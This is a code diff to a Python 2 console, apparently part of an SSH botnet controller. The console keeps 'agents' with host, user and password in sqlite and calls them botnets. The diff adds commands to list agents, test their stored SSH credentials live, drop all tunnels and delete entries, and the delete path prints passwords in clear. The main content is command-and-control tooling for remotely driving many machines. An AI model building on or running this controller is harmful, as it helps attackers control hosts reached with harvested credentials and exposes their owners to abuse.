@@ -31,26 +31,70 @@ class Console(cmd.Cmd):
         self.con    = sqlite3.connect('helpers/database.db')
         self.db     = self.con.cursor()
         self.db.execute(funcSQL.sqlite.createTables)
-        self.settings   = {'limited':None,'all' :[],'check' :[],'agents':{}}
+        self.settings   = {'limited':None,'all' :{},'check' :[],'agents':{}}
         self.sshConnect = ssh
         self.search_all_agents()
     def do_list(self,args):
-        """ list all bots in-database """
-        self.settings['all'] = []
-        for bot in self.db.execute(funcSQL.sqlite.selectAllBots):self.settings['all'].append(bot)
-        if self.settings['all'] != []:
-            print color.display_messages('Agents:',info=True,sublime=True)
-            print tabulate(self.settings['all'],headers=funcSQL.sqlite.headers)
-            color.linefeed()
+        """ list/check/filter list agents on database """
+        arg_parser = argparse.ArgumentParser(prog='list',description='interact with one/all agents')
+        arg_parser.add_argument('-i', '--id', dest='id',type=int,metavar='<id>', help='list agent  by id')
+        arg_parser.add_argument('-c', '--check',dest='check', action='store_true', help='check credentials by agent Available')
+        arg_parser.add_argument('-d', '--db',dest='database', action='store_true', help='list all agents on database')
+        try:
+            args=arg_parser.parse_args(shlex.split(args))
+        except: return
+        self.settings['all'] = {}
+        self.listbotsprint = []
+        for agent in self.db.execute(funcSQL.sqlite.selectAllBots):self.settings['all'][agent[0]] = agent
+        if self.settings['all'] == {}:
+            print color.display_messages('No Agents registered',info=True)
             return
-        print color.display_messages('No Agents registered',info=True)
+        if args.database:
+            if args.id and not args.check:
+                if not args.id in self.settings['all'].keys():
+                    print color.display_messages('ID not registered',info=True)
+                    return
+                print color.display_messages('Agents:',info=True,sublime=True)
+                agent = list(self.settings['all'][args.id])
+                self.listbotsprint += list([agent])
+                print tabulate(self.listbotsprint,headers=funcSQL.sqlite.headersCheck)
+
+            elif args.check and args.id:
+                agent = self.settings['all'][args.id]
+                if not args.id in self.settings['all'].keys():
+                    print color.display_messages('ID not registered',info=True)
+                    return
+                print color.display_messages('Agents:',info=True,sublime=True)
+                agent = list(self.settings['all'][args.id])
+                agent.insert(len(agent),self.sshConnect.ssh(agent[1],agent[2],agent[3],checkconnect=True).status)
+                self.listbotsprint += list([agent])
+                print tabulate(self.listbotsprint,headers=funcSQL.sqlite.headersCheck)
+
+
+            elif args.database and not args.check:
+                print color.display_messages('Agents:',info=True,sublime=True)
+                for bots in self.settings['all'].items():self.listbotsprint += list([bots[1]])
+                print tabulate(self.listbotsprint,headers=funcSQL.sqlite.headers)
+                color.linefeed()
+                return
+
+            elif args.database and not args.id:
+                print color.display_messages('Agents:',info=True,sublime=True)
+                for agent in self.settings['all'].items():
+                    agent = list(agent[1])
+                    agent.insert(len(agent),self.sshConnect.ssh(agent[1],agent[2],agent[3],checkconnect=True).status)
+                    self.listbotsprint += list([agent])
+                print tabulate(self.listbotsprint,headers=funcSQL.sqlite.headers)
+                color.linefeed()
+        else:
+            arg_parser.print_help()
 
     def do_interact(self,args):
         """ interact with one/all agents """
         arg_parser = argparse.ArgumentParser(prog='interact',description='interact with one/all agents')
         arg_parser.add_argument('-i', '--id', dest='id',type=int,metavar='<id>', help='connect with particular agent SSH by id')
         arg_parser.add_argument('-a', '--all',dest='all', action='store_true', help='connect all agent Available')
-        arg_parser.add_argument('-r', '--reset',dest='reset', action='store_true', help='reset all connections with agents')
+        arg_parser.add_argument('-q', '--quit',dest='quit', action='store_true', help='quit all connections with agents')
         try:
             args=arg_parser.parse_args(shlex.split(args))
         except: return
@@ -81,10 +125,14 @@ class Console(cmd.Cmd):
                 color.setcolor('ON',color='green')),info=True)
             self.settings['limited'] = None
             print color.display_messages('Added botnets with success.',sucess=True)
-        elif args.reset:
-            self.search_on_agents()
+        elif args.quit:
             self.settings['limited'] = None
-            print color.display_messages('Reseted all connections with agents',info=True)
+            for agent in self.settings['agents'].keys():
+                if self.settings['agents'][int(agent)]['tunel'] != None:
+                    print color.display_messages('HOST::{} broken::[{}]'.format(self.settings['agents'][agent]['creds']['Host'],
+                    color.setcolor('OFF',color='red')),info=True)
+                    self.settings['agents'][int(agent)]['tunel'].logout()
+            print color.display_messages('Connection broken all agents',info=True)
         else:
             arg_parser.print_help()
 
@@ -117,10 +165,10 @@ class Console(cmd.Cmd):
         for items in self.settings['check']:
             if search('ON',items[5]):agentsCount +=1
         color.linefeed()
-        print color.display_messages('Agents: {}'.format(color.setcolor(str(agentsCount),color='blue')),info=True)
+        print color.display_messages('Online Agents: {}'.format(color.setcolor(str(agentsCount),color='blue')),info=True)
 
     def search_all_agents(self):
-        for bot in self.db.execute(funcSQL.sqlite.selectAllBots):self.settings['all'].append(bot)
+        for agent in self.db.execute(funcSQL.sqlite.selectAllBots):self.settings['all'][agent[0]] = agent
 
     def search_on_agents(self):
         for agent in self.db.execute(funcSQL.sqlite.selectAllBots):
@@ -155,13 +203,16 @@ class Console(cmd.Cmd):
             args=arg_parser.parse_args(shlex.split(args))
         except: return
         if args.id:
-            for items in self.settings['all']:
-                if int(items[0]) == args.id:
-                    print color.display_messages('Search ID:',sublime=True,info=True)
-                    print color.display_messages('Search query for finding a particular id',info=True)
-                    print color.display_messages('Section DELETE FROM statement.',info=True)
-                    print color.display_messages('ID:{} (Host:{} User:{} Password:{})'.format(items[0],items[1],items[2],items[3],items[4]),info=True)
-                    funcSQL.deleteID(self.con,self.db,args.id)
+            self.search_all_agents()
+            if not args.id in self.settings['all'].keys():
+                print color.display_messages('ID not found',info=True)
+                return
+            items =  self.settings['all'][args.id]
+            print color.display_messages('Found ID:',sublime=True,info=True)
+            print color.display_messages('Search query for finding a particular id',info=True)
+            print color.display_messages('Section DELETE FROM statement.',info=True)
+            print color.display_messages('ID:{} (Host:{} User:{} Password:{})'.format(items[0],items[1],items[2],items[3],items[4]),info=True)
+            funcSQL.deleteID(self.con,self.db,args.id)
             if funcSQL.lengthDB(self.db) < 1:
                 self.db.execute(funcSQL.sqlite.zeraids)
                 self.con.commit()
